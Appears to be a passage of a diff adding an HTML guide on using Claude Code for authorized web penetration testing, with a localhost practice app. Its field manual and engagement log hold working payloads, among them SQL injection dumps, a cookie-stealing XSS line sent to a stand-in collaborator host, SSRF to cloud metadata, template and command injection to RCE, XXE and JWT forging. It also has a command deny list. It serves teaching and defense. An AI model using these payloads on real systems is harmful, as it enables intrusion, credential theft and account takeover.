+<h4>Phase 6 &middot; Reporting</h4>
+<p class=goal>Goal: turn a messy session into a client-ready deliverable. The other very-high-fit phase.</p>
+<p>Hand Claude your notes and evidence; it produces structured findings &mdash; title, CVSS 3.1 vector
+and score, affected asset, numbered reproduction, evidence reference, business impact, and a
+code-level remediation &mdash; deduplicated and sorted by severity. What used to be an evening of
+copy-paste becomes a draft you edit. Keep a human in the loop on severity calls and on any claim
+that reaches the executive summary.</p>
+<div class="lbl">Prompt</div>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>Turn the confirmed findings in notes.md into a client report. For each:
+title, CVSS 3.1 vector + score, affected asset, step-by-step reproduction,
+evidence reference, business impact, and a remediation with a concrete
+code-level fix. Merge duplicates, sort by severity, and open with a
+two-paragraph executive summary a non-technical reader can follow. Markdown.</pre></div>
+</div>
+</div>
+<p class=mut>Each phase's prompt assumes the scope from Phase 0 is loaded. The value compounds: by
+Phase 6 the model already holds the whole engagement in context, so the report writes itself from
+what it did rather than from what you re-explain.</p>
+</section>
+
+<div class=divider><span>Breaking websites</span></div>
+
+<section><h2><span class=n>3</span>The web attacker's field manual</h2>
+<p>This is the applied core: the vulnerability classes that actually get web apps popped, each with
+how you get Claude Code to <b>find</b> it, how you <b>exploit</b> it, the <b>payloads</b> that prove it,
+and the <b>fix</b>. The workflow underneath all of them is the same &mdash; proxy the app's traffic
+through Burp (via its MCP server) or a local <code>mitmproxy</code>, and let Claude read, mutate,
+and replay requests while reasoning about the responses. It's a tester who never gets bored of the
+2,000th request.</p>
+<div class=note><b>Mindset.</b> Every input is a question the server answers honestly if you phrase
+it right: a query string, a header, a cookie, a JSON field, a filename, a JWT claim, a
+<code>Host:</code> line. Claude's job is to enumerate those inputs, form a hypothesis about how
+each is used server-side, and craft the one payload that confirms it. Yours is to point it at a
+target you're allowed to break and to verify every hit by hand.</div>
+
+<details class=card><summary><b>1 &middot; SQL injection</b><span class=tag>Critical &middot; RCE-capable</span></summary>
+<div class=body>
+<p class=mut>User input reaches a SQL query unescaped &mdash; read/modify the whole database, bypass login,
+sometimes execute OS commands.</p>
+<div class="lbl">Find it with Claude Code</div>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>Grep the backend for string-built SQL (f-strings, concatenation, .format
+into a query, raw exec). For every hit, show file:line, the tainted param,
+and the route that reaches it. Then, for each GET/POST param in requests.txt,
+test error/boolean/time-based SQLi and tell me which respond.</pre></div>
+<div class="lbl">Exploit &mdash; payloads</div>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>payloads<button class=copy>Copy</button></div><pre><span class=cmt># auth bypass</span>
+' OR '1'='1' --
+<span class=cmt># column count + data exfil</span>
+' ORDER BY 5-- -          <span class=cmt># find column count</span>
+' UNION SELECT null,username,password,null,null FROM users-- -
+<span class=cmt># boolean-blind (compare true vs false response)</span>
+' AND 1=1-- -   vs   ' AND 1=2-- -
+<span class=cmt># time-blind (5s delay == injectable)</span>
+' OR SLEEP(5)-- -                    <span class=cmt># MySQL</span>
+'; WAITFOR DELAY '0:0:5'--           <span class=cmt># MSSQL</span></pre></div>
+<div class="lbl">Confirm &amp; automate</div>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>shell<button class=copy>Copy</button></div><pre><span class=cmd>sqlmap -u "https://t/item?id=1" --batch --dbs --risk 2 --level 3</span>
+<span class=cmt># Claude reads sqlmap's dump, pulls the hashes, and hands them</span>
+<span class=cmt># to hashcat, then explains which accounts cracked.</span></pre></div>
+<p class=mut><b>Fix:</b> parameterized queries / prepared statements; least-privilege DB user; never
+concatenate input into SQL.</p>
+</div></details>
+
+<details class=card><summary><b>2 &middot; Cross-site scripting (XSS)</b><span class=tag>High &middot; account takeover</span></summary>
+<div class=body>
+<p class=mut>Your markup executes in a victim's browser &mdash; steal sessions, keylog, pivot to full
+account takeover. Reflected (in the response), stored (persisted), or DOM (client-side sink).</p>
+<div class="lbl">Find it with Claude Code</div>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>Grep the frontend for DOM sinks: innerHTML, outerHTML, document.write,
+insertAdjacentHTML, dangerouslySetInnerHTML, eval, and jQuery .html().
+Trace which read from location.hash/search, postMessage, or server data.
+Separately, reflect a canary (zqxj) through every input and report where it
+lands unencoded in the HTML, an attribute, or a script context.</pre></div>
+<div class="lbl">Exploit &mdash; payloads by context</div>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>payloads<button class=copy>Copy</button></div><pre><span class=cmt># HTML body</span>
+<span class=cmd>&lt;script&gt;alert(document.domain)&lt;/script&gt;</span>
+<span class=cmt># breaks out of an attribute</span>
+"&gt;&lt;img src=x onerror=alert(1)&gt;
+<span class=cmt># javascript: URI sink (href/src)</span>
+javascript:alert(1)
+<span class=cmt># session-steal PoC (authorized lab, your collaborator host)</span>
+&lt;img src=x onerror="new Image().src='//COLLAB/?c='+document.cookie"&gt;</pre></div>
+<p class=mut>Claude fingerprints the app's encoding/filter, then mutates the payload until one survives
+(case-swap, event-handler variants, HTML-entity or unicode escapes, breaking the parser with
+<code>&lt;svg&gt;</code>/<code>&lt;math&gt;</code>).</p>
+<p class=mut><b>Fix:</b> contextual output encoding, framework auto-escaping, a strict Content-Security-Policy,
+<code>HttpOnly</code> cookies so script can't read them.</p>
+</div></details>
+
+<details class=card><summary><b>3 &middot; Broken access control &amp; IDOR</b><span class=tag>High &middot; mass data exposure</span></summary>
+<div class=body>
+<p class=mut>The single most common serious web bug: the server trusts the client about <em>who</em> or
+<em>what</em> you may access. Read other users' data, escalate to admin, invoke actions not meant
+for you.</p>
+<div class="lbl">Exploit patterns Claude automates</div>
+<ul>
+<li><b>IDOR:</b> increment/replace object IDs (<code>/api/orders/1001</code> &rarr; <code>1002</code>), swap UUIDs, try another tenant's ID.</li>
+<li><b>Forced browsing:</b> hit <code>/admin</code>, <code>/api/internal/*</code> directly as a low-priv user.</li>
+<li><b>Method / verb tampering:</b> a blocked <code>DELETE</code> that works as <code>POST</code> with <code>X-HTTP-Method-Override</code>.</li>
+<li><b>Mass assignment:</b> add <code>"role":"admin"</code> or <code>"isVerified":true</code> to the JSON body.</li>
+</ul>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>Log in as low-priv user A (creds in env). For every object-referencing
+endpoint in the OpenAPI spec, replay it substituting user B's IDs and also
+with no auth header. Diff the responses and flag any that return B's data
+or a 200 where you'd expect 403. Then retry each write with an extra
+"role":"admin" field and report which are honored.</pre></div>
+<p class=mut><b>Fix:</b> enforce authorization server-side on every object, per request; deny by default;
+never derive identity from a client-supplied ID.</p>
+</div></details>
+
+<details class=card><summary><b>4 &middot; Authentication &amp; session flaws</b><span class=tag>High &middot; takeover</span></summary>
+<div class=body>
+<p class=mut>Weak login, tokens, or resets. JWT confusion, crackable secrets, predictable reset links,
+no rate limiting, OAuth redirect abuse.</p>
+<div class="lbl">JWT attacks Claude walks through</div>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>jwt<button class=copy>Copy</button></div><pre><span class=cmt># decode, then try alg:none (drop the signature)</span>
+header={"alg":"none","typ":"JWT"}  payload={"user":"admin"}  sig=(empty)
+<span class=cmt># or brute a weak HS256 secret</span>
+<span class=cmd>hashcat -m 16500 jwt.txt rockyou.txt</span>
+<span class=cmt># then re-sign with the cracked key and set role=admin</span></pre></div>
+<p class=mut>Other angles Claude scripts (against an authorized lab): credential stuffing with a wordlist
+where there's no lockout, enumerating valid users from differing error messages/timing,
+brute-forcing 6-digit reset codes with no rate limit, and testing whether a password-reset token
+is time- or counter-predictable.</p>
+<p class=mut><b>Fix:</b> pin the JWT algorithm to an allowlist and verify it; long random secrets; rate
+limiting + lockout; constant-time comparisons; single-use, high-entropy, expiring reset tokens.</p>
+</div></details>
+
+<details class=card><summary><b>5 &middot; Server-side request forgery (SSRF)</b><span class=tag>Critical &middot; cloud pivot</span></summary>
+<div class=body>
+<p class=mut>Make the server fetch a URL <em>you</em> choose &mdash; reach internal services, and on cloud hosts,
+steal instance credentials from the metadata endpoint.</p>
+<div class="lbl">Where to look, and the payloads</div>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>payloads<button class=copy>Copy</button></div><pre><span class=cmt># any param that fetches a URL: webhooks, image/PDF proxies, "import from URL"</span>
+http://169.254.169.254/latest/meta-data/iam/security-credentials/   <span class=cmt># AWS</span>
+http://metadata.google.internal/computeMetadata/v1/   <span class=cmt># GCP (needs header)</span>
+http://localhost:6379/                    <span class=cmt># internal Redis, etc.</span>
+<span class=cmt># filter bypasses</span>
+http://0x7f000001/  http://2130706433/  http://[::1]/  http://127.0.0.1.nip.io/</pre></div>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>Find every parameter that causes the server to make an outbound request.
+For each, test the cloud metadata IP and localhost with the bypasses above,
+watching response time and body for a difference. If AWS metadata responds,
+pull the IAM role creds -- read-only, capture as evidence, do not use them.</pre></div>
+<p class=mut><b>Fix:</b> allowlist outbound hosts, block link-local/private ranges, require IMDSv2, never
+fetch a raw user-supplied URL.</p>
+</div></details>
+
+<details class=card><summary><b>6 &middot; Template injection (SSTI) &amp; command injection</b><span class=tag>Critical &middot; RCE</span></summary>
+<div class=body>
+<p class=mut>Both end in remote code execution. SSTI: input rendered as a server template. Command
+injection: input reaches a shell.</p>
+<div class="lbl">SSTI &mdash; detect then escalate</div>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>ssti<button class=copy>Copy</button></div><pre><span class=cmt># probe: does 49 come back?</span>
+${7*7}   {{7*7}}   &lt;%= 7*7 %&gt;   #{7*7}
+<span class=cmt># Jinja2 (Python) RCE gadget once confirmed</span>
+{{ cycler.__init__.__globals__.os.popen('id').read() }}</pre></div>
+<div class="lbl">Command injection &mdash; payloads</div>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>cmdi<button class=copy>Copy</button></div><pre>; id     | id     $(id)     `id`     && id
+<span class=cmt># blind: confirm via delay or out-of-band DNS</span>
+; sleep 5     ; nslookup $(whoami).COLLAB</pre></div>
+<p class=mut>Claude fingerprints the template engine from how the <code>7*7</code> probe behaves, then
+builds the engine-specific gadget; for cmdi it greps for <code>os.system</code>,
+<code>subprocess(..., shell=True)</code>, <code>child_process.exec</code>, backticks, and traces
+input to them, then crafts a filter bypass (<code>$IFS</code>, quotes, encoding).</p>
+<p class=mut><b>Fix:</b> never render user input as a template; sandbox engines; avoid the shell entirely,
+pass arguments as an array, allowlist values.</p>
+</div></details>
+
+<details class=card><summary><b>7 &middot; Path traversal, LFI &amp; file upload</b><span class=tag>High &middot; RCE-capable</span></summary>
+<div class=body>
+<p class=mut>Read files outside the intended directory, include local files, or upload a shell.</p>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>payloads<button class=copy>Copy</button></div><pre><span class=cmt># traversal / LFI</span>
+../../../../etc/passwd        ..%2f..%2f..%2fetc%2fpasswd
+php://filter/convert.base64-encode/resource=index.php   <span class=cmt># leak source</span>
+<span class=cmt># upload bypasses to drop a webshell</span>
+shell.php.jpg     shell.phtml     Content-Type: image/png (spoofed)
+<span class=cmt># LFI -> RCE via log poisoning: put PHP in User-Agent, include the log</span></pre></div>
+<p class=mut>Claude finds file/path params, fuzzes traversal depth with <code>ffuf</code>, and chains LFI to
+RCE (log poisoning, <code>php://</code> wrappers, session files).</p>
+<p class=mut><b>Fix:</b> canonicalize and allowlist paths, store uploads outside the webroot, validate type
+by content not extension, randomize stored filenames.</p>
+</div></details>
+
+<details class=card><summary><b>8 &middot; XXE &amp; insecure deserialization</b><span class=tag>Critical &middot; RCE / file read</span></summary>
+<div class=body>
+<p class=mut>XML parsers that resolve external entities leak files and enable SSRF; deserializing
+untrusted data hands over code execution through gadget chains.</p>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>xxe<button class=copy>Copy</button></div><pre>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;r&gt;&amp;xxe;&lt;/r&gt;
+<span class=cmt># blind: point SYSTEM at an external DTD on your COLLAB host for OOB exfil</span></pre></div>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>deserialization<button class=copy>Copy</button></div><pre><span class=cmt># spot the format by magic bytes: rO0AB... = Java, O:8 = PHP, gASV = pickle</span>
+<span class=cmd>java -jar ysoserial.jar CommonsCollections1 'id' | base64</span>
+<span class=cmt># drop that into the cookie/param that gets deserialized</span></pre></div>
+<p class=mut>Claude recognizes serialized blobs by their magic bytes, picks a gadget chain that fits the
+libraries on the classpath, and builds the payload.</p>
+<p class=mut><b>Fix:</b> disable DTDs/external entities; don't deserialize untrusted data &mdash; or restrict to
+signed, allowlisted types.</p>
+</div></details>
+
+<details class=card><summary><b>9 &middot; CSRF, business logic &amp; race conditions</b><span class=tag>Medium&ndash;High &middot; fraud</span></summary>
+<div class=body>
+<p class=mut>The bugs scanners miss because they require understanding what the app <em>means</em>. Claude is
+unusually good here because it reasons about intent, not just syntax.</p>
+<ul>
+<li><b>CSRF:</b> a state-changing request with no anti-CSRF token or <code>SameSite</code> cookie &mdash;
+Claude generates an auto-submitting PoC page.</li>
+<li><b>Logic:</b> negative quantities for a refund, reusing a one-time coupon, tampering the price
+field, skipping a checkout step, promoting yourself via a "team invite" flow.</li>
+<li><b>Race / TOCTOU:</b> fire N parallel requests to redeem one gift card or withdraw one balance
+twice (single-packet / last-byte-sync).</li>
+</ul>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>Read the checkout and wallet flows. List every invariant the server assumes
+the client will respect (price >= 0, coupon used once, balance checked before
+debit). For each, design the request sequence that violates it, and write a
+script that sends 20 concurrent debit requests to test for a double-spend race.</pre></div>
+<p class=mut><b>Fix:</b> anti-CSRF tokens + <code>SameSite</code>; validate every invariant server-side;
+atomic, locked, idempotent operations for anything touching money or stock.</p>
+</div></details>
+
+<details class=card><summary><b>10 &middot; Exposed secrets &amp; misconfiguration</b><span class=tag>Varies &middot; instant win</span></summary>
+<div class=body>
+<p class=mut>Often the fastest path in &mdash; nobody had to be tricked, something was just left open.</p>
+<ul>
+<li><b>Exposed <code>.git/</code>:</b> reconstruct the whole source with <code>git-dumper</code>, then read it for more bugs.</li>
+<li><b>Leaked <code>.env</code> / backups:</b> <code>ffuf</code> for <code>.env</code>, <code>.bak</code>, <code>config.php~</code>, <code>db.sql</code>.</li>
+<li><b>Cloud storage:</b> world-readable/writable S3 buckets and blobs.</li>
+<li><b>CORS:</b> <code>Access-Control-Allow-Origin</code> reflecting any origin <em>with</em> credentials.</li>
+<li><b>Subdomain takeover:</b> a dangling CNAME to an unclaimed service.</li>
+<li><b>Default / weak creds</b> and verbose stack traces that hand you the stack.</li>
+</ul>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>Fuzz each host for .git/HEAD, .env, .DS_Store, backup and archive files.
+If .git is exposed, dump and reconstruct the source, then scan it for
+secrets and hardcoded credentials. Test CORS by sending Origin: evil.example
+and reporting any ACAO reflection with Allow-Credentials: true.</pre></div>
+<p class=mut><b>Fix:</b> keep VCS metadata, dotfiles, and backups out of the webroot; lock down bucket ACLs;
+strict CORS allowlist; rotate any leaked secret; disable verbose errors in prod.</p>
+</div></details>
+
+<p class=mut>None of these are novel &mdash; they're the OWASP staples, which is the point: the value Claude adds
+isn't inventing exploits, it's covering the entire surface fast and never skipping the tedious
+check that turns out to matter.</p>
+</section>
+
+<section><h2><span class=n>4</span>The practice target: VulnShop</h2>
+<p>Reading about payloads only gets you so far &mdash; you need something to break. This report ships a
+runnable one. <b>VulnShop</b> is a ~150-line Flask app in <code>lab/vulnshop.py</code> that wires up
+every class in the field manual as a real, exploitable endpoint. It binds to <code>127.0.0.1</code>,
+so the target is a machine you own and testing it is authorized by definition.</p>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>run the lab<button class=copy>Copy</button></div><pre><span class=cmd>pip install flask</span>
+<span class=cmd>python3 lab/vulnshop.py</span>
+<span class=cmt># serving http://127.0.0.1:5000/  -- open it for the endpoint index</span>
+<span class=cmt># then point Claude Code at the target (proxied through Burp/mitmproxy)</span></pre></div>
+<div class=note><b>How to use it.</b> Open a Claude Code session in the <code>lab/</code> folder, give it
+the &sect;2 Phase-0 scope prompt (in scope: <code>127.0.0.1:5000</code>), and walk the field manual top
+to bottom &mdash; <code>/search</code>, then <code>/login</code>, then <code>/api/orders</code>, and so on.
+Because the source is right there, try it both black-box (only the running app) and white-box (let it
+read <code>vulnshop.py</code> first) and watch how much faster the white-box pass is.</div>
+
+<h3>Walking the manual against VulnShop</h3>
+<p>Every payload below is one that was run against the shipped app; the "What you get" column is the
+actual response.</p>
+<table class=cap>
+<tr><th>Class</th><th>Endpoint</th><th>Payload</th><th>What you get</th></tr>
+<tr><td><b>1</b> SQLi (exfil)</td><td><code>GET /search?q=</code></td><td><code>x' UNION SELECT username,password FROM users-- -</code></td><td><code>admin:S3cur3P@ss!</code>, <code>alice:alice123</code>, <code>bob:hunter2</code></td></tr>
+<tr><td><b>1</b> SQLi (bypass)</td><td><code>POST /login</code></td><td><code>username=admin' -- </code></td><td>logged in as admin; a JWT cookie is issued</td></tr>
+<tr><td><b>2</b> Reflected XSS</td><td><code>GET /search?q=</code></td><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td><td>reflected unencoded &mdash; script runs</td></tr>
+<tr><td><b>2</b> Stored XSS</td><td><code>POST /reviews</code></td><td><code>comment=&lt;script&gt;steal()&lt;/script&gt;</code></td><td>persisted; fires for every visitor</td></tr>
+<tr><td><b>3</b> IDOR</td><td><code>GET /api/orders/1003</code></td><td>(no auth header)</td><td>the admin's $500 order, unauthenticated</td></tr>
+<tr><td><b>4</b> JWT forge</td><td><code>GET /admin</code></td><td>cookie <code>token</code> = <code>{"alg":"none"}</code>, <code>role=admin</code></td><td><code>Admin panel &mdash; flag{jwt_forged_or_cracked}</code></td></tr>
+<tr><td><b>5</b> SSRF</td><td><code>GET /avatar?url=</code></td><td><code>http://127.0.0.1:5000/internal/creds</code></td><td><code>AccessKeyId: AKIAFAKE</code> from an "internal-only" route</td></tr>
+<tr><td><b>6</b> SSTI &rarr; RCE</td><td><code>GET /greet?name=</code></td><td><code>{{7*7}}</code> then a Jinja2 <code>os.popen('id')</code> gadget</td><td><code>49</code>, then live command output</td></tr>
+<tr><td><b>6</b> Cmd injection</td><td><code>GET /ping?host=</code></td><td><code>127.0.0.1;id</code></td><td><code>uid=501(&hellip;) gid=20(staff)&hellip;</code></td></tr>
+<tr><td><b>7</b> Path traversal</td><td><code>GET /download?file=</code></td><td><code>../flag.txt</code></td><td><code>flag{path_traversal_ok}</code> &mdash; outside the files dir</td></tr>
+<tr><td><b>8</b> Deserialization</td><td><code>GET /prefs</code></td><td>a <code>prefs</code> cookie = base64 pickle with <code>__reduce__</code></td><td>arbitrary command executes on load</td></tr>
+<tr><td><b>9</b> Mass assignment</td><td><code>POST /profile</code></td><td><code>role=admin</code></td><td>your own account is promoted to admin</td></tr>
+<tr><td><b>10</b> Exposed secrets</td><td><code>GET /.env</code></td><td>(just request it)</td><td><code>JWT_SECRET=s3cr3t</code>, DB and AWS keys</td></tr>
+</table>
+<p class=mut>Notice class 10 feeds class 4: the leaked <code>JWT_SECRET=s3cr3t</code> is exactly the key you
+need to forge the admin token by signature instead of the <code>alg:none</code> trick. That's the
+point of doing them in one sitting &mdash; findings compose.</p>
+
+<h3>Chaining it into a full compromise</h3>
+<p>The real lesson is the handoffs. Here each finding feeds the next, the way an actual session runs:</p>
+<div class=flow>
+<div class=node>Recon<small>read source</small></div><div class=arw>&rarr;</div>
+<div class=node>SQLi<small>dump users</small></div><div class=arw>&rarr;</div>
+<div class=node>Secret<small>/.env leak</small></div><div class=arw>&rarr;</div>
+<div class=node>JWT<small>forge admin</small></div><div class=arw>&rarr;</div>
+<div class=node>SSRF<small>cloud creds</small></div><div class=arw>&rarr;</div>
+<div class=node>SSTI<small>shell</small></div>
+</div>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>engagement log vs. VulnShop (real payloads)<button class=copy>Copy</button></div><pre><span class=cmt>[recon]  read vulnshop.py: /search concat SQL, /avatar fetches any url,</span>
+<span class=cmt>         /greet renders a template, /.env is served, JWT secret is weak</span>
+<span class=cmt>[sqli]   /search?q=x' UNION SELECT username,password FROM users-- -</span>
+<span class=cmt>         -> admin:S3cur3P@ss!  alice:alice123  bob:hunter2</span>
+<span class=cmt>[secret] GET /.env -> JWT_SECRET=s3cr3t   (or forge with alg:none)</span>
+<span class=cmt>[authz]  signed JWT {role:admin} -> GET /admin -> flag{jwt_forged...}</span>
+<span class=cmt>[ssrf]   /avatar?url=http://127.0.0.1:5000/internal/creds -> AKIAFAKE</span>
+<span class=cmt>[rce]    /greet?name={{ cycler.__init__.__globals__.os.popen('id')... }}</span>
+<span class=cmt>         -> uid=501(...) gid=20(staff)   # code execution</span>
+<span class=cmt>[report] Claude writes all findings up with CVSS, repro, and fixes</span></pre></div>
+<p>Reading <code>vulnshop.py</code> first meant Claude knew <em>which</em> parameters to hit, so it never
+fuzzed blind; it spotted the SSRF and SSTI in the same pass it found the SQLi, because reading-for-bugs
+is one pass, not three. A human does all of this too &mdash; just not in one uninterrupted afternoon, and
+not while keeping the report current at the same time.</p>
+<div class=warn><span class=h>The line that matters</span>
+VulnShop is yours, on localhost. The exact same session against a system you don't have permission to
+test is a computer-crime offense &mdash; the technique is identical, only the authorization differs, and
+the authorization is the whole thing.</div>
+</section>
+
+<section><h2><span class=n>5</span>Setup: making it safe and repeatable</h2>
+<p>Four pieces of configuration turn the generic CLI into a purpose-built, guard-railed pentest rig.</p>
+
+<h3>Permission modes &mdash; your primary safety control</h3>
+<p>Claude Code gates tool use through modes you switch between: <b>default</b> (prompts before each
+new command), <b>plan mode</b> (reads and reasons, runs nothing &mdash; ideal for the analysis phase),
+and <b>accept-edits</b> for trusted loops. There is also a bypass mode
+(<code>--dangerously-skip-permissions</code>); on live targets, <b>don't</b> &mdash; the prompts are the
+seatbelt. Encode standing rules in <code>.claude/settings.json</code>:</p>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>.claude/settings.json<button class=copy>Copy</button></div><pre>{
+  "permissions": {
+    "allow": [
+      "Bash(nmap:*)", "Bash(httpx:*)", "Bash(nuclei:*)",
+      "Bash(ffuf:*)", "Bash(subfinder:*)"
+    ],
+    "deny": [
+      "Bash(rm:*)", "Bash(dd:*)", "Bash(curl:* prod-pay.acme.example*)",
+      "Read(./client-data/**)"
+    ]
+  }
+}</pre></div>
+<p class=mut>Allow-list the recon tooling so it runs without friction; deny-list destructive commands and
+out-of-scope hosts so they can't run at all. The deny list wins over the allow list.</p>
+
+<h3>A custom slash command for your methodology</h3>
+<p>Drop a Markdown file in <code>.claude/commands/</code> and it becomes a reusable
+<code>/command</code>. Bake your recon flow in once:</p>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>.claude/commands/recon.md<button class=copy>Copy</button></div><pre><span class=cmt># Passive recon on $ARGUMENTS, honoring SCOPE.md.</span>
+<span class=cmt># Enumerate subdomains, resolve live hosts, fingerprint,</span>
+<span class=cmt># and output a deduped table. Passive sources only.</span></pre></div>
+<p class=mut>Now <code>/recon acme-lab.example</code> runs the whole Phase&nbsp;1 flow. Do the same for
+enumeration, analysis, and reporting to standardize an engagement across a team.</p>
+
+<h3>Subagents and MCP</h3>
+<p>Define a specialized <b>subagent</b> in <code>.claude/agents/</code> &mdash; say an
+<code>appsec-reviewer</code> that only reads code and reports findings &mdash; and the main agent
+delegates the Phase&nbsp;3 sweep to it, keeping analysis isolated from anything that acts. Connect
+tools over <b>MCP</b> (<code>claude mcp add &hellip;</code>): PortSwigger ships a Burp Suite MCP
+server, so Claude can drive an intercepting proxy; you can wire in your own scanners or a findings
+database the same way.</p>
+
+<h3>The defensive mirror: <code>/security-review</code></h3>
+<p>The same engine plays defense. Claude Code ships a <code>/security-review</code> command that
+audits your <em>own</em> pending diff for injection, auth, secrets, and crypto mistakes; Anthropic
+open-sourced the equivalent <b>GitHub Action</b> so it runs on every pull request. The cheapest
+pentest finding is the one caught before it ever ships &mdash; run the offensive playbook against
+staging and this against the codebase, and the two halves close the loop.</p>
+</section>
+
+<section><h2><span class=n>6</span>Guardrails: what it will and won't do</h2>
+<p>Claude Code is deliberately dual-use-aware. It <b>assists</b> authorized penetration testing,
+CTF challenges, security research, and defensive work. It <b>refuses</b> the things that
+characterize malicious intent regardless of how they're framed:</p>
+<table class=cap>
+<tr><th>Supported (with authorization context)</th><th>Refused</th></tr>
+<tr><td>Scanning, enumeration, PoC exploits on in-scope targets</td><td>Attacks on systems you can't show authorization for</td></tr>
+<tr><td>Reading code to find and fix vulnerabilities</td><td>Denial-of-service and destructive payloads</td></tr>
+<tr><td>Writing and explaining exploit techniques for a lab/CTF</td><td>Mass-targeting, worms, and self-propagating code</td></tr>
+<tr><td>Drafting findings, remediation, detections</td><td>Ransomware, credential harvesting, supply-chain implants</td></tr>
+<tr><td>Building dual-use tooling for a stated engagement</td><td>Detection-evasion / anti-forensics for malicious ends</td></tr>
+</table>
+<p>The practical consequence: <b>give it the context it needs to help you legitimately.</b> State
+the engagement, point at the scope doc, and it engages as a copilot. Ask for something that looks
+like real-world harm with no authorization and it declines. That boundary is a feature &mdash; it's
+what lets the tool exist in this space at all &mdash; but it is not your compliance program. Scope,
+authorization, and the law are still yours to get right.</p>
+</section>
+
+<section><h2><span class=n>7</span>What it can't do</h2>
+<ul>
+<li><b>It is not an autonomous attacker.</b> It's strongest as a copilot on a human-driven
+engagement. Long multi-stage kill chains drift, lose thread, and need steering. The win is
+throughput on the tedious 80%, not lights-out hacking.</li>
+<li><b>It hallucinates findings.</b> Confident, well-formatted, and occasionally wrong. Nothing
+reaches a report until you've reproduced it against the live target with your own eyes.</li>
+<li><b>Permission friction is real &mdash; and load-bearing.</b> The approvals that slow it down are the
+same ones keeping it in scope. Tune the allow/deny lists; don't reach for the bypass flag on
+anything you don't own.</li>
+<li><b>It doesn't replace judgment.</b> Severity, business context, chaining low-risk bugs into a
+real attack, and knowing when to stop are still the tester's job.</li>
+<li><b>The liability is yours.</b> The tool's refusals reduce accidental harm; they do not
+authorize anything. Written permission and legal scope come from you, every time.</li>
+</ul>
+</section>
+
+<section><h2>The one-screen checklist</h2>
+<p class=mut>Before you start an engagement. Tap to tick off &mdash; kept in your browser only.</p>
+<ul class=check>
+<li><input type=checkbox><span><span class=k>Authorization in hand.</span> Signed scope / engagement letter / CTF rules covering every target.</span></li>
+<li><input type=checkbox><span><span class=k>Scope loaded.</span> In- and out-of-scope ranges written into <code>SCOPE.md</code> / <code>CLAUDE.md</code>.</span></li>
+<li><input type=checkbox><span><span class=k>Guardrails set.</span> <code>settings.json</code> allow-lists recon tools, deny-lists destructive commands and out-of-scope hosts.</span></li>
+<li><input type=checkbox><span><span class=k>Bypass off.</span> No <code>--dangerously-skip-permissions</code> on anything you don't own.</span></li>
+<li><input type=checkbox><span><span class=k>Logging on.</span> The agent keeps an engagement log of every command and rationale.</span></li>
+<li><input type=checkbox><span><span class=k>Verification discipline.</span> Every finding reproduced live before it's written up.</span></li>
+<li><input type=checkbox><span><span class=k>Minimal impact.</span> Prove and stop &mdash; no persistence, no exfiltration beyond evidence.</span></li>
+<li><input type=checkbox><span><span class=k>Defensive mirror.</span> <code>/security-review</code> or the CI action running on the codebase too.</span></li>
+</ul>
+</section>
+
+<footer>A study, July 17, 2026. Codename <b>Klefki</b> &mdash; the key-ring. For authorized penetration
+testing, CTF, and security research only; not a substitute for legal authorization or professional
+judgment. Tool behavior and guardrails reflect Claude Code as of mid-2026 and evolve over time.</footer>
+</div>
+
+<script>
+(function(){
+  // phase stepper
+  var btns=[].slice.call(document.querySelectorAll('.pbtn'));
+  var panels=[].slice.call(document.querySelectorAll('.ppanel'));
+  btns.forEach(function(b){
+    b.addEventListener('click',function(){
+      var p=b.getAttribute('data-p');
+      btns.forEach(function(x){x.classList.toggle('on',x===b);});
+      panels.forEach(function(x){x.classList.toggle('on',x.getAttribute('data-p')===p);});
+    });
+  });
+  // copy buttons
+  document.querySelectorAll('.copy').forEach(function(btn){
+    btn.addEventListener('click',function(){
+      var pre=btn.closest('.term,.prompt').querySelector('pre');
+      var txt=pre.innerText.replace(/ /g,' ');
+      navigator.clipboard&&navigator.clipboard.writeText(txt).then(function(){
+        var o=btn.textContent;btn.textContent='Copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent=o;btn.classList.remove('done');},1400);
+      });
+    });
+  });
+  // checklist toggle (in-page only)
+  document.querySelectorAll('.check li').forEach(function(li){
+    var cb=li.querySelector('input');
+    function sync(){li.classList.toggle('done',cb.checked);}
+    li.addEventListener('click',function(e){if(e.target!==cb){cb.checked=!cb.checked;}sync();});
+    cb.addEventListener('change',sync);
+  });
+})();
+</script>
+</body></html>
